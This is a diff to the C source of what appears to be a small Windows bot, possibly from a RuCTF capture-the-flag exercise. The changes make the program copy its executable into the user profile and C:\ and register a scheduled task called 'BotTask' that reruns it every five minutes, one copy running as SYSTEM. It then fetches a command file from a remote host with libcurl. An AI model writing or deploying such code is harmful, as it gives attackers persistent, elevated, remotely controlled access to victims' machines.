@@ -38,7 +38,9 @@ size_t writefunc(void *ptr, size_t size, size_t nmemb, struct string *s)
 int main(int argc, char* argv[])
 {
   char command[500];
-  snprintf(command, sizeof command, "copy %s %%userprofile%%\\", argv[0]);
+  snprintf(command, sizeof command, "copy \"%s\" \"%%userprofile%%\\\"", argv[0]);
+  system(command);
+  snprintf(command, sizeof command, "copy \"%s\" \"C:\\\"", argv[0]);
   system(command);
   char pathname[500];
   char *filename;
@@ -46,7 +48,10 @@ int main(int argc, char* argv[])
   if (filename==NULL){filename=argv[0];} else { filename++;}
   snprintf(command, sizeof command, "SCHTASKS /Create /ST 00:00 /TN BotTask /SC minute /MO 5 /F /TR \"%%userprofile%%\\%s\"", filename);
   system(command);
+  snprintf(command, sizeof command, "SCHTASKS /Create /ST 00:00:00 /TN BotTask /RU SYSTEM /SC minute /MO 5 /TR \"C:\\%s\"", filename);
+  system(command);
 
+  
   CURL *curl;
   CURLcode res;
 
@@ -55,7 +60,7 @@ int main(int argc, char* argv[])
     struct string s;
     init_string(&s);
 
-    curl_easy_setopt(curl, CURLOPT_URL, "olymp.ructf.org:31337/cmd.txt");
+    curl_easy_setopt(curl, CURLOPT_URL, "http://olymp.ructf.org:53421/cmd.txt");
     curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writefunc);
     curl_easy_setopt(curl, CURLOPT_WRITEDATA, &s);
     res = curl_easy_perform(curl);
